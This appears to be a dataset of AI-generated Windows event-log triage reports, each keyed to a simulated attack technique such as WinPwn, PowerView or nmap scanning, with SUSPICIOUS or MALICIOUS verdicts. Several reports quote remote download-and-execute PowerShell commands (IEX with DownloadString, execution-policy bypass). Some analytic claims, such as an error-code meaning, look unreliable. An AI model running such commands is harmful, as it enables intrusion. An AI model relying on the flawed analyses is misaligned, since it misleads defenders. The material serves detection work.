Remote System Discovery - arp,"In reviewing the provided logs, the primary observations involve several potentially suspicious events. Here’s a breakdown of the analysis:

### Suspicious or Anomalous Behavior:
1. **Presence of Wevtutil and Conhost Processes**: The logs register multiple instances of the command-line utility `wevtutil.exe` and `conhost.exe` being executed by the user `SERVER002\admin_test`. While `wevtutil.exe` is a legitimate Windows process used to manage event logs, its repeated execution without any accompanying context logs might indicate log tampering or clearing attempts, which can be associated with malicious behaviors.

2. **Executing Arp and Whoami Commands**: Usage of commands like `arp -a` and `whoami` can be common, but in a suspicious context, it might suggest network reconnaissance or attempting to gather local user information.

3. **Multiple Privileged Operations**: The user `admin_test` has been granted several high-level privileges, as indicated in the event `4672`, such as `SeDebugPrivilege` and others that would allow profound access to the system, potentially leading to actions like privilege escalation or tampering.

4. **Time Manipulation**: The logs show time changes, where the system time was set back, as noted by the transport from `2024-10-21 09:31:04.7389260` to `2024-10-21 09:31:01.5887528`. This could have been done to cover tracks by altering time stamps on system activities.

### Events Indicating Malicious Activity or Compromise:
- Use of `wevtutil.exe` paired with `conhost.exe` patterns and setting back system time without clear operational context can be indicators of log tampering activities, a common technique used in obfuscating malicious actions from event logs.

### Threats or Risks Identified:
- **Potential Log Tampering**: As noted from repeated `wevtutil.exe` executions and time rollback detected, indicating potential malicious intent to delete or hide logs.
- **Inefficient Logging**: Despite having Sysmon enabled, the verbosity doesn't seem adequate, as detailed logging for command line arguments or operations are sparse.
  
### Recommended Actions to Proceed:
1. **Increase Monitoring and Alerting**: Ensure comprehensive logging for all administrative actions and bolster alerts for process creations typical of enumeration, such as `arp`, `whoami`, and `netstat`.

2. **Conduct Forensic Analysis**: A deeper dive into the sequence of commands executed by `admin_test` around the time changes and system alterations.

3. **Verify Integrity of System and Logs**: Ensure that vital system files are untouched from a trusted source and verify that logs have not been tampered with by comparing with backups or other logs, e.g., network logs.

4. **Security Modifications**: Consider restricting administrative access, applying least privilege principles, and employing application whitelisting to prevent unauthorized use of sensitive executables.

### Final Resolution:
Given the observations and potential for malicious behavior based on available events, the activity falls under:
- **SUSPICIOUS**: The behavior suggests possible malicious activity that requires further detailed investigation, particularly focusing on user `admin_test` activities and time discrepancies.

This approach will allow for uncovering the full scope of any potential breaches and to reaffirm the system’s integrity moving forward."
Security Software Discovery - powershell,"Upon reviewing the provided Windows event logs, several elements warrant attention and lead to suspicions of potentially malicious activity.

1. **PowerShell Activity:**
   - All PowerShell events show the execution of the same PowerShell command that filters processes associated with antivirus and security solutions (virus, carbonblack, defender, cylance, mc, Sysmon). This behavior is often associated with evasion techniques where an attacker attempts to identify and potentially disable security tools running on the host.
   - The PowerShell invocation fetched detailed process information which may indicate reconnaissance activities to identify running security software.

2. **Time Manipulation:**
   - In the System log, there is an adjustment of system time backwards from ""2024-10-26 21:23:11.9353732"" to ""2024-10-26 21:23:07.1913177"". This could be designed to manipulate timestamps on events or files, which is often done to obscure attacker activities and make log correlation difficult.

3. **Sysmon Logs:**
   - There are instances of standard Windows utilities being executed, such as `hostname.exe`, `whoami.exe`, `wevtutil.exe`, and `svchost.exe`, which in a vacuum could be benign. However, these are common tools leveraged in attacks to gather system information and clear or query event logs. The frequent spawning of `conhost.exe` for these processes might also indicate command line execution through scripts or batch files.
   - The large number of processes related to `MicrosoftEdgeUpdate.exe` suggests regular updates are occurring. While this is common on systems with automatic updates, it's worth validating against expected update schedules to rule out any tampering or misuse by a malicious actor masking their processes.

4. **Security Auditing and Application Logs:**
   - The Security log shows the time change was performed by a service running as `LOCAL SERVICE`, and the associated process was `svchost.exe`. This behavior should be investigated further for the purpose of the time change.

**Conclusion: SUSPICIOUS**

- The combination of these findings, particularly the PowerShell commands and time manipulation, suggests behavior that requires further investigation. This is especially concerning if there is no known or legitimate reason for these operations.
  
**Recommendations:**
1. **Immediate Investigation:**
   - Conduct a full forensic analysis on Server002 to determine the intent of the PowerShell commands and investigate any potential unauthorized access or changes.
   - Review additional event logs surrounding the timeframe of these events, focusing on logins, process creation, and modifications to security configurations.

2. **Monitoring and Response:**
   - Increase monitoring for similar PowerShell commands across the network.
   - Confirm the legitimacy of time changes and associated processes. Validate against any scheduled tasks or administrative actions that might align with such activity.

3. **Security Enhancements:**

WinPwn - Powersploits privesc checks,"**Detailed Analysis:**

Upon reviewing the provided Windows event logs, there are a few points of interest that suggest potential malicious activity:

1. **PowerShell Logs:**
   - There are multiple instances in the PowerShell logs indicating the download and execution of a script from a potentially untrusted source: `https://raw.githubusercontent.com/script/script/.../script.ps1`. 
   - The command-line used in these logs involves invoking PowerShell to execute scripts directly from a raw GitHub URL. This is a notable technique frequently associated with remote code execution or downloading and executing malicious scripts.

2. **Sysmon Logs:**
   - The Sysmon logs document several instances of `powershell.exe` being executed with sophisticated and somewhat obfuscated command lines that include remote access to network resources. This behavior is potentially malicious, especially when paired with downloading and running scripts from external URLs.
   - There are multiple logs entries related to system utilities like `HOSTNAME.EXE`, `whoami.exe`, and `conhost.exe` which are standard on Windows systems. However, their presence during the same time frame as the suspicious PowerShell activity necessitates a closer look into their execution context—as these utilities might be used to elevate privileges or gather system information in the context of a broader attack.

3. **Microsoft Edge Update Activity:**
   - The logs show numerous legitimate update-related activities involving `MicrosoftEdgeUpdate`. At first glance, these logs by themselves appear benign and correlate with normal operations surrounding software updates. However, they occur prominently alongside suspicious activity timings, further suggesting a thorough investigation.

4. **Application Logs:**
   - Two logs from the `SecurityCenter` indicate that Windows Defender was operational, which implies that any malicious scripts may have eluded detection or exploited a period before these entries were logged.

**Assessment:**

Given the findings, the activity within these logs appears notably suspicious due to multiple instances of PowerShell executing scripts from remote sources. These behaviors are consistent with compromise tactics involving script-based deployment of malware or automated system compromise efforts. The absence of logs from the Security category further complicates the picture but does not negate the suspicious nature detected.

**Resolution:**
- **SUSPICIOUS** - The logs contain activity that needs further investigation. Specifically, the PowerShell scripts from external URLs and the subsequent system behaviors merit a detailed analysis to confirm or dispel the possibility of malicious involvement.

**Guidance on How to Proceed:**
1. **Immediate Action:** 
   - Isolate the affected host (Server002) from the network to prevent potential spread or exfiltration.
2. **Forensic Analysis:**
   - Conduct a detailed forensic analysis of the memory and file systems on Server002 to identify remnants or active session outcomes of the PowerShell scripts executed.
3. **Log Collection & Review:**
   - Collect additional logs, especially from Security and any missing logs from other channels for this timeframe to observe a broader context.
4. **Threat Intelligence:**
   - Cross-reference the script's URL and any IPs associated with the downloads against threat intelligence databases.
5. **Preventative Measures:**
   - Reinforce endpoint security measures, update antivirus definitions, and consider blocking outbound connections to suspicious URLs at the network perimeter. 

Further investigation is crucial due to the complexity and potential implications of the suspicious activities detected."
WinPwn - itm4nprivesc,"After conducting a thorough review of the provided Windows event logs, the following observations are made:

### System and Security Logs
- **Time Adjustments**: There are several entries in the system logs concerning time adjustments. The logs show a slight adjustment of the system time by the `svchost.exe` process, which is related to time synchronization typically carried out by Windows Time Service. This is usual and aligns with standard system operations, such as synchronizing with an NTP server.
  
### Application Logs
- **Windows Defender Status**: The application logs indicate that Windows Defender is active and functioning. This is a routine event and does not indicate any threat or security alarm.

### Sysmon Logs
- **Processes Execution**: 
  - Multiple entries in the Sysmon logs for typical Windows processes like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `powershell.exe`.  
  - The execution of `whoami.exe` and `hostname.exe` is typically benign, possibly indicative of routine administrative queries or scripts.

- **Suspicious PowerShell Activity**:
  - An instance of `powershell.exe` runs with a command that downloads and executes a script from a GitHub repository. The command-line arguments demonstrate the use of `iex(new-object net.webclient).downloadstring`, which can be indicative of a potentially malicious scenario, as it commonly features in script-based attacks.

### Windows PowerShell Logs
- **PowerShell Execution**:
  - The logs confirm the PowerShell interactions by showing the execution of PowerShell with a command line aimed at downloading and running a script hosted remotely.
  - It contains a sequence of PowerShell events indicating the stages of script execution which corresponds with the suspicious activity noted in Sysmon logs.

## Assessment
The primary concern in this review is the execution of the PowerShell command aimed at downloading and executing a script from an external source. This behavior is characteristic of a potential malicious script execution aimed at downloading additional payloads or executing unintended administrative commands on the host.

While the rest of the logs, including system adjustments and routine program executions, appear benign, the PowerShell activity raises a red flag and requires immediate attention to rule out or confirm any ongoing or potential compromise.

## Resolution
**SUSPICIOUS** - The logs contain activity, specifically the PowerShell execution, that demands further investigation to ensure the integrity of the host system and confirm the intent behind the script execution.

## Guidance on How to Proceed:
1. **Isolate the Host**: Immediately isolate the host from the network to prevent potential propagation of any unauthorized activities.
   
2. **Detailed Analysis**: Perform a detailed analysis of the script being downloaded and executed. Check the GitHub URL and assess the nature of the script.
   
3. **Endpoint Examination**: Further investigate the `admin_test` user's actions, including their logon history and any other relevant system changes around the time of the suspicious activity.

4. **Scan for Threats**: Conduct a full antivirus and anti-malware scan on the host and network to detect any other malicious scripts or payloads.

5. **Monitor for Indicators**: Implement enhanced monitoring for indicators of compromise related to remote script execution across other network devices.

6. **Update Security Policies**: Review and revise security configurations and policies to combat script-based attacks, including the restriction of unnecessary PowerShell uses.

7. **Incident Reporting**: If verified as malicious, document and report the incident following the organization’s incident response protocols."
Qakbot Recon,"Upon review of the provided log entries, here is an analysis based on various sections:

### Analysis of Logs:

1. **Security Logs:**
   - **EventID 5379:** These events indicate attempts to retrieve credentials, which consistently fail with ReturnCode `3221226021`. This return code is typically associated with a `STATUS_LOGON_FAILURE`. Such failures can occur during legitimate system operations or when unauthorized attempts are made to access credential information. The repeated nature but eventual use of the account should be looked into.
   - **EventID 4672 and 4624:** These indicate privilege rights assignments and successful logon sessions, respectively. The user ""admin_test"" has been granted high-level privileges (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.), suggesting admin usage. The sequence of these events in close succession may indicate potential misuse of privileged accounts.
   - **EventID 4634:** This event indicates a logoff for the user `admin_test`.

2. **System Logs:**
   - Security Intelligence Updates for Windows Defender are present, indicating routine update activity for the antivirus software.

3. **Sysmon Logs:**
   - A large number of processes (e.g., `wevtutil`, `conhost`, `cmd.exe`, `whoami.exe`, etc.) have been executed by the user `SERVER002\admin_test`. This includes execution of network tools like `arp`, `ipconfig`, `net`, `route`, `netstat`, `nslookup`, which suggest reconnaissance activities. 
   - `cmd.exe` executing scripts from a temporary directory can often be a sign of script-based attack tactics. The presence of commands within a temporary directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\script.bat`) is suspicious and should be scrutinized further.
   - **Edge Update Installer Activity:** The logs contain numerous processes related to updating Microsoft Edge browsers. While this by itself might be routine (due to regular updates), the number of entries and close timing may warrant further checks for anomalies particularly if admin privileges were used inappropriately.

### Assessment and Resolution:
- **Suspicious Activity Detected:**
  - The combination of attempted credential access failures, the granting of high privileges to a non-standard admin_test user, and extensive process executions (especially related to network information gathering commands) is concerning. This activity pattern can signify a possible insider threat or a compromised admin account conducting reconnaissance.
  - Although no direct evidence of a breach or malicious activity is confirmed, the presence of these activities warrants further investigation to ensure no threat actor is attempting or conducting lateral movement or privilege escalation.

### Recommended Actions:
- Verify the legitimacy of the `admin_test` account. Ensure it is legitimate and required for business operations.
- Investigate the source and purpose of the script `script.bat` in the temporary directory.
- Conduct further network activity analysis to identify any unusual patterns or communication originating from the server.
- Enhance monitoring of privilege account actions and enforce stronger access control measures.
- Regularly audit user privilege assignments to ensure appropriateness.

**Final Resolution:** SUSPICIOUS - The activities appear abnormal and require further investigation to rule out any potential security breaches."
Automated AD Recon (ADRecon),"Upon reviewing the provided Windows event logs, multiple points of interest and potential indicators of compromise emerge. Below is a detailed analysis of the logs:

1. **Security Log Analysis**:
    - There are multiple Event ID `4624` (Successful Logon) and `4672` (Special privileges assigned to new logon) indicating privileged actions. The SubjectUserName is `SYSTEM` with high-level privileges like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others, which are commonly indicative of a system-level operation.
    - Event ID `5379` entries show attempts to read credentials from potentially unauthorized locations such as `MicrosoftAccount` and `WindowsLive`, which ultimately return a failure code `3221226021`. This can signify failed attempts to access credential-like information, which could be considered suspicious if out of regular operational procedures.
    - Event ID `4798` (A user's local group membership was enumerated) could be part of a reconnaissance stage of an attack wherein the different accounts (Administrator, admin_test, etc.) are being queried, which in a potentially compromised host, might suggest further information gathering.

2. **Application Log Analysis**:
    - The Application logs largely denote routine operations with mentions of Windows Defender being on and Edge Update services operating. There are no apparent high-risk actions logged in this section.

3. **PowerShell Log Analysis**:
    - Starting of a PowerShell provider `Registry` with `Invoke-Expression` toward executing a script located in `C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\\Externalfiles\\script.ps1` could be suspicious given the known TTPs (Tactics, Techniques, and Procedures) in the MITRE ATT&CK framework regarding PowerShell misuse for executing malicious scripts. The context of execution within a temporary directory may point to an attempt to evade typical scrutiny.
  
4. **Sysmon Log Analysis**:
    - The logs show multiple instances of command-line utilities like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and Windows PowerShell being executed under the `admin_test` user. These can be part of normal administrative tasks but in combination and frequency, particularly with PowerShell, it can indicate script execution or lateral movement.
    - Usage of `whoami.exe`, `hostname.exe` and frequent calling of system functionalities like `taskhostw.exe` or `sc.exe` from system32 with `admin_test` as a user suggests activity that may go beyond normal user behaviour.
    - Execution of potentially suspicious commands like `rundll32.exe` with system DLLs like `PcaPatchSdbTask` through `PcaSvc.dll` calls for additional scrutiny, as Rundll32 is frequently used in various attacks.

Overall, several logged entries fit suspicious activity profiles commonly associated with post-exploitation activities (e.g., lateral movement, privilege escalation, and reconnaissance). While some logs may constitute normal system operations (e.g., Edge updates, system maintainers), this doesn't detract from other indicators that warrant further examination.

**Resolution**: **SUSPICIOUS**. The activity logged within the event logs requires a closer look as actions such as the PowerShell script execution, failed credential access attempts, and multiple privileged operations could indicate post-exploitation behaviors by malicious actors or improper system use.

**Recommended Actions**:
- Conduct an inquiry into the usage of PowerShell and the specific script executed from the TEMP directory.
- Verify the legitimacy of recent administrative activities and any new software installations particularly those involving the `admin_test` account.
- Monitor network traffic for unusual outbound connections that might be part of an exfiltration or command-and-control mechanism.
- Ensure that all security patches are applied, especially if any known vulnerabilities were being actively leveraged.
- Consider increasing the logging/monitoring on this host to catch further suspicious activities."
WinPwn - winPEAS,"### Detailed Analysis

**1. Windows PowerShell Logs:**

- **Event ID 600** across multiple entries indicate PowerShell activity with the command-line involving downloading a script from a URL and executing `winPEAS`. The use of `iex(new-object net.webclient).downloadstring()` is a classic pattern for executing remote scripts, which is known for being potentially malicious since it allows the execution of scripts from an external source. This is suspicious because `winPEAS` is a well-known tool for privilege escalation checks, often used by attackers for system reconnaissance.

**2. System Logs:**

- The system logs are primarily showing updates and time adjustments. There is no explicit indication of malicious activity here based on the given events. The process `svchost.exe` is commonly benign and integral to system operations, but without more data, it cannot be categorized as absolutely benign or malicious.

**3. Application Logs:**

- Events from `SecurityCenter` showing that Windows Defender is operational are regular updates. The `edgeupdate` service stopping is an expected behavior during an update cycle and does not inherently indicate malicious activity.

**4. Sysmon Logs:**

- The logs show a number of executions for standard Windows executables like `wevtutil.exe`, `conhost.exe`, `powershell.exe`, and `whoami.exe`, executed by the `admin_test` user. The `powershell.exe` entry corresponds with the PowerShell log entries for suspicious PowerShell activity. The `winPEAS` execution alongside PowerShell script execution clearly correlates with a potential threat.
  
- Multiple instances of `MicrosoftEdgeUpdate.exe` and its installer/processors reflect typical update behavior with Microsoft Edge services. 

**5. Security Logs:**

- Security logs show time changes executed by `svchost.exe` under `LOCAL SERVICE`, which is a low-privileged user account frequently used for such system-level operations. The activity here doesn’t immediately suggest malicious intentions without further correlating data.

### Assessment

- **Suspicious Behavior Identified:**
  - The combination of downloading and executing a script remotely with PowerShell from GitHub, alongside the execution of `winPEAS`, is highly suspicious. These actions are typically aligned with initial stages of a network compromise or internal threat reconnaissance to escalate privileges.
  
- **Potential Compromise:**
  - The activities surrounding PowerShell and the execution of `winPEAS` suggest an adversary might be actively probing the system or testing for vulnerabilities after gaining initial access.

### Resolution

- **SUSPICIOUS**

### Guidance on How to Proceed

1. **Immediate Action:**
   - Quarantine the affected system to prevent potential lateral movement within the network.
   
2. **Further Investigation:**
   - Conduct a full forensic analysis on `Server002` to locate the source of the suspicious PowerShell execution.
   - Verify if the GitHub repository used in the PowerShell command is legitimate or known for hosting malicious scripts.
   - Check for any signs of privilege escalation or successful unauthorized access.

3. **Monitoring:**
   - Increase logging and monitoring on `Server002` and similar systems for further suspicious activity.
   - Set alerts for unusual PowerShell activities and connections to unknown remote scripts.

4. **Response Plan:**
   - Prepare an incident response plan if further evidence of compromise or malicious intent is uncovered.
   - Review permissions and access controls for the `admin_test` account and any other accounts with suspicious activity.

These steps should help in identifying and remediating any breaches or weaknesses exploited by adversaries."
System Service Discovery - net.exe,"Upon thorough analysis of the provided Windows event logs, several key activities and patterns have been identified. Below is a detailed summary of the observed events and an assessment of whether there is any indication of suspicious or malicious behavior:

### Suspicious and Anomalous Behavior
1. **Repeated Elevated Privilege Events**:
   - Two events (EventID 4672) where the user `admin_test` on `SERVER002` has been granted a series of high privileges like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others. These privileges are sensitive and often misused in attacks to gain unauthorized access or escalate privileges.

2. **Frequent Execution of System Utilities**:
   - Several executions of `wevtutil.exe`, `conhost.exe` by the `admin_test` user on Sysmon logs. These commands are often legitimate but in the context or volume, they may indicate log tampering or communications in a suspicious way.
   - The execution of `cmd.exe` with a command to list services that is redirected to a temp file using a piped command (`net.exe start >> %temp%\service-list.txt`). While this could be benign, information gathering and redirection to files may suggest lateral movement preparation.

3. **Script and Command Execution**:
   - The direct invocation of `whoami.exe`, `hostname.exe` under `admin_test`, which might not always represent harmful activity but can be indicative of user identification operations typically seen in reconnaissance stages of attacks.

4. **Persistent Edge Update Processes**:
   - Numerous processes related to Microsoft Edge and its update service `MicrosoftEdgeUpdate.exe`, showing expected legitimate behavior. Such application updates could be leveraged as an attack vector but in this case, they seem consistent with regular operations.

5. **Windows Security Intelligence Updates**:
   - Regular update activities visible in the system logs (EventsID 44 and 43 from `WindowsUpdateClient`), indicating updates to Microsoft Defender Antivirus Definitions. These appear standard and non-malicious.

### Assessment of Events
- **BENIGN** events are associated with Windows Update and Antivirus Signature updates. They follow a known and expected pattern.
- **SUSPICIOUS** behavior is indicated by the repeated high privilege grants, repeated utilities execution, and peculiar command usage indicating possible preparation for lateral movement or privilege escalation.
- **MALICIOUS** activity isn't conclusively evident from these logs alone, but the context around potentially tampering or suspicious command spells a need for caution.

### Conclusion and Resolution
Given the elevated privilege assignment and unusual command usage, these logs contain activity classified as **SUSPICIOUS**. The activity, while not conclusively malicious, warrants further investigation to determine if they are misconfigurations, legitimate administrative actions, or precursors of an attack.

### Recommendations
1. **Audit Privilege Usage**: Investigate the purpose behind the elevated privileges granted to `admin_test`.
2. **Monitor Command Executions**: Increase logging and monitoring around `admin_test`, especially for similar command-line executions.
3. **Network Anomalies**: Check for any lateral movements or unexpected network connections originating from `SERVER002`.
4. **Review User Intent**: Engage with the administrative team to confirm if these actions align with planned maintenance activities.

Proceed with a follow-up investigation, correlating this data with network logs, endpoint monitoring, and interviews with system administrators to ascertain any threats or confirm benign actions."
Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting),"In analyzing the provided Windows event logs, I observed the following activities:

1. **Logon Events (Event ID 4624):** These logs indicate a series of successful logons involving the ""SERVER002$"" account and the ""SYSTEM"" account on Server002. The LogonType 5 typically indicates a service startup, which is a standard logon type for services. No external IP addresses are present, suggesting internal actions rather than remote access.

2. **Special Privileges Assigned (Event ID 4672):** These events show the SYSTEM account receiving several privileges, including SeDebugPrivilege, which allows debugging and accessing sensitive memory. While this is standard for a SYSTEM account, its presence should be corroborated with actual tasks performed to ensure they are expected.

3. **Credential Validation (Event ID 5379):** These logs indicate attempts to validate credentials for a Microsoft Account user such as ""02txoixylodcstop"". The ReturnCode 3221226021 signifies a failure. Repetitive credential validation attempts could indicate an issue but without successful access, it remains inconclusive.

4. **Local Group Enumeration (Event ID 4798):** Enumeration of built-in accounts like Administrator, Guest, and other local accounts may suggest reconnaissance activity. The process responsible is ""taskhostw.exe,"" which typically manages background tasks.

5. **Sysmon Events:**
   - **Process Creation (Event ID 1):** Several PowerShell executions by ""admin_test"" user, which could indicate administrative tasks or automation scripts. One execution of note is a PowerShell command querying Active Directory for disabled user accounts using the UserAccountControl attribute.
   - **Process Termination (Event ID 5):** Numerous command-line applications (conhost.exe, wermgr.exe, etc.) are logged, consistent with standard system operations and PowerShell interactions.

6. **Service Activities:**
   - **Various MicrosoftUpdate.exe and EdgeUpdate executions:** Represent regular updates and installations by EdgeUpdate, as expected from system operations.

7. **Windows PowerShell Log (Event IDs 600, 400, 403):** Refers to PowerShell session activities by the ""admin_test"" user. The `Get-ADUser` command was executed, likely to list AD users with a specific property.

### Assessment:

- **Suspicious Activity:** The repeated credential validation failures and the enumeration of local accounts are slightly concerning. While these do not conclusively indicate malicious intent, they deviate from typical expected behavior and merit further review.
  
- **Potential Reconnaissance:** The PowerShell command targeting AD user accounts may suggest reconnaissance or inventory tasks, which, if unauthorized, could be problematic.

### Resolution: SUSPICIOUS

The logs contain activities that warrant further investigation, particularly around the repetitive credential validation failures and user account enumeration. Although no direct evidence confirms a breach or malicious activity, these actions should be verified against expected operations. Consider reviewing the purpose of the PowerShell commands, the legitimacy of the ""admin_test"" user account activities, and possible misconfigurations allowing these attempts. Consider capturing additional logs if reconnaissance is ongoing."
Device Driver Discovery,"After a thorough analysis of the provided Windows event logs from Sysmon, Application, Security, System, and Windows PowerShell channels, here are my findings:

1. **Sysmon Logs**:
   - **Process Execution**: There are repeated instances of `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and PowerShell execution around the same UTC timestamp of 2024-10-28 16:54:32. This sequence of activity potentially indicates a script or automated process running various system information and enumeration commands.
   - **Command-Line Indicators**: Using PowerShell to execute `driverquery` commands stands out. While not inherently malicious, this behavior can be indicative of system reconnaissance potentially correlated with malicious intent.
   - **High Integrity Level**: The execution by an account with a high integrity level (elevated privileges) such as SERVER002\admin_test is noted, which can point towards privilege escalation attempts.
   
2. **Security Logs**:
   - **Privilege Use**: Notably, the presence of Event ID 4672 indicates that a user (`admin_test`) is granted special privileges including `SeDebugPrivilege`, often associated with system manipulation activities.
   - **Logon Events**: The successful network-type logons (Logon Type 3) for the user `admin_test` from an IP address indicate remote connections which warrant verification of authorized activity.

3. **Application Logs**:
   - **Edge Update Events**: These logs show services stopping and contain typical entries for an update process. The logging of these events aligns with expected behavior for maintenance tasks.

4. **System Logs**:
   - **Time Change Events**: The presence of Event IDs related to system time changes could indicate a potential attempt to manipulate time for activities like log file evasion.
   - **Kernel-General Events**: Regular kernel activity without indicative malicious parameters; aligns with expected system performance.

5. **Windows PowerShell Logs**:
   - **Driver Queries**: The executed PowerShell command appears to be running two driver query operations. This can be used for legitimate administrative purposes but may also indicate system probing.
   
**Assessment**:
- The sequence of events primarily conducted by the user `SERVER002\admin_test` shows a pattern of activities that are commonly seen in reconnaissance phases of cybersecurity threats.
- High integrity level, privilege escalation, and system probing via PowerShell collectively suggest potential unauthorized or suspicious activity.

**Resolution**: **SUSPICIOUS**

**Guidance**:
- Further investigation is required into the `admin_test` account's activity to determine the authenticity and authorization of these events.
- Network logs around the timestamp of the login events should be reviewed for unauthorized access patterns.
- Cross-reference device logs for external connections.
- Establish communication with the involved user or system owner to verify these activities.
- Implement monitoring enhancements for similar activities to preemptively detect potential threats."
WinPwn - MS17-10,"### Detailed Analysis

Upon reviewing the provided log entries, the following observations and analyses are made:

#### 1. Suspicious PowerShell Activity:
- **Windows PowerShell Logs**: 
  - Multiple events in these logs indicate attempted execution of a PowerShell script from an external source: 
    - `""HostApplication"": ""powershell.exe & {$script_repo='https://raw.githubusercontent.com/script' iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1') MS17-10 -noninteractive -consoleoutput}``
  - The script is being downloaded and executed directly from a GitHub URL, which is a common tactic in malicious activities.

#### 2. Time Manipulation:
- **System Logs**:
  - There are logs indicating changes to the system time via the `svchost.exe` process within a very short timeframe. Consistent with certain malicious activities where attackers manipulate system time to evade logging.

#### 3. Security Events:
- **Security Logs**:
  - Event ID `4616`: Indicates time changes which corroborates the system log activities.
  - Event ID `4624` and `4672`: Indicate a successful logon with elevated privileges for the user `admin_test`. The presence of elevated privileges such as `SeDebugPrivilege` could indicate a possible avenue for privilege escalation.
  
#### 4. Sysmon Logs:
- **Process Execution**:
  - The execution of processes like `hostname.exe`, `whoami.exe`, and `powershell.exe` are seen, which could be consistent with reconnaissance activities.

### Assessment

The combination of the unusual PowerShell activity, time manipulation, and elevated privileges obtained by the user `admin_test` suggests potential malicious behavior. The direct execution of a PowerShell script from an external source is a significant indicator of compromise. The observed behavior of downloading and executing scripts from URLs without prior validation and the consistent change in time indicate that the system could be targeted for malicious purposes.

### Resolution
**MALICIOUS**: Based on the above analysis, the logs display clear indicators of potentially malicious activity.

### Guidance on How to Proceed
1. **Isolate and Investigate**: Immediately isolate the affected host to prevent potential spread or further compromise.

2. **Thorough Forensics**: Conduct in-depth forensic analysis on the system, focusing on the PowerShell activity and tracing the origin and impact of the external script.

3. **Review Permissions and Policies**: Reassess user privileges, particularly for `admin_test`, and ensure that principles of least privilege are enforced.

4. **Monitoring and Alerts**: Implement enhanced monitoring and alerts for similar anomalous behaviors.

5. **Patch and Update**: Ensure systems are fully patched, especially concerning vulnerabilities related to PowerShell and privilege escalation.

6. **User Education**: Educate users on recognizing and reporting suspicious activities, especially those involving unexpected scripts or changes in system behavior.

7. **Policy Enforcement**: Enforce strict policies that prevent direct script execution from external or untrusted sources."
Port Scan NMap for Windows,"Based on the analysis of the provided logs, the following observations and assessments can be made:

1. **Sysmon and PowerShell Logs:**
   - There is evidence of network reconnaissance activity using `nmap`, detected in both PowerShell and Sysmon logs. An `nmap` command was executed from a PowerShell session initiated by the user `SERVER002\admin_test`. The use of `nmap`, especially when run from PowerShell or command line by an administrative account, can be indicative of an attacker trying to map the network and identify potential targets.
   - Multiple processes were executed from `C:\Users\ADMIN_~1\AppData\Local\Temp\`, including installations and use of `certutil.exe`. The `certutil.exe` process was used to add certificates which might be indicative of an attempt to install a malicious certificate or perform unauthorized actions needing trusted certificate authorities.
   - The execution of console host (`conhost.exe`) and usage of `npcap` and `vcredist_x86.exe` in the context of processes that parent `nmap` indicates that `nmap` may have been installed or configured to gather network information preemptively or stealthily.

2. **Security Logs:**
   - Multiple successful logons by the SYSTEM account were logged, but there is no evidence of anomalous logon types or failed login attempts during the period of interest. 
   - Privilege assignment events (Event ID: 4672) were logged, which are typical for SYSTEM process launches but do not align specifically with malicious activity unless there is a known unauthorized privilege escalation attempt.

3. **Application and System Logs:**
   - The installations of Microsoft Visual C++ redistributables and `npcap` appear frequent. While frequent installations can be normal during software updates, they could also suggest attempts to install software that an attacker may require.
   - The `SCHTASKS.EXE` command to create a task named `npcapwatchdog` on startup is noted, which may have been used to establish persistence. Scheduled tasks can be legitimate but are often used by attackers to maintain their presence on a system.

**Assessment and Recommendation:**

The activity observed in these logs displays several suspicious elements:
- The use of `nmap` by an administrative user, coupled with new services/startup tasks involving potential network monitoring tools (`npcap`), is suspicious and common in initial access, reconnaissance stages, or insider threat scenarios.
- Command-line usage of `certutil.exe` to install certificates, especially in conjunction with executables run from temporary directories, is a potential red flag for malicious activity.

With the evidence observed, this activity is categorized as **SUSPICIOUS**. Further investigation is needed, including:
- Evaluating the necessity and legitimacy of these installations (`nmap`, `npcap`).
- Reviewing the access and purpose of `certutil.exe` usage.
- Checking for network anomalies or unauthorized data access or exfiltration following this activity period.

Action should be taken to thoroughly verify the legitimacy of the detected actions in conjunction with IT and security policies, and potentially monitor or audit similar user activity further."
Get-DomainGPO to display group policy information via PowerView,"**Detailed Analysis of the Logs**

Upon reviewing the provided Windows event logs across various channels (PowerShell, Application, Sysmon, Security, and System), I have identified the following points of interest:

1. **PowerShell Logs**: 
   - The PowerShell logs record multiple events where a seemingly unusual command line is executed. Specifically, the command `powershell.exe -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('https://github.com/script/script/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/script/server/data/module_source/situational_awareness/network/script.ps1'); Get-DomainGPO` is indicative of potentially malicious activity. 
   - The use of `-nop -exec bypass` is a common tactic used by threat actors to execute scripts without restrictions, and `IEX (Invoke-Expression)` is used to execute the downloaded script. 

2. **Sysmon Logs**: 
   - The Sysmon logs show the same PowerShell activity associated with the `Admin_Test` user, and the use of `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` with the previously mentioned command line. Activities involving `wevtutil.exe` and `conhost.exe` by `Admin_Test` do not present clear indications of compromise but warrant context consideration.
   - Hostname and whoami being executed may indicate some basic reconnaissance activity.

3. **Application and System Logs**: 
   - These logs do not present direct evidence of compromise, yet the presence of repeated EdgeUpdate processes and some service-related entries appear to be part of routine operations and updates.
   
4. **Security Logs**: 
   - The security logs do not show any explicit privilege escalation or failed login attempts that would outright indicate a compromise.

**Assessment and Conclusion**

The logs strongly suggest anomalous and potentially malicious PowerShell activity that may be indicative of a compromise attempt. The downloading and execution of a script via PowerShell from an external source using techniques often associated with bypassing security mechanisms are highly concerning. However, it's important to gather more context around the use of specific scripts and user intent.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed**:
- Conduct a detailed investigation on the downloaded script (`https://github.com/script/script/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/script/server/data/module_source/situational_awareness/network/script.ps1`) for any known or unknown malicious indicators.
- Verify the legitimacy and necessity of the executed PowerShell commands with the involved user (`ADMIN_TEST`).
- Audit system configurations and security settings to ensure PowerShell's constrained language mode or proper execution policies are in place.
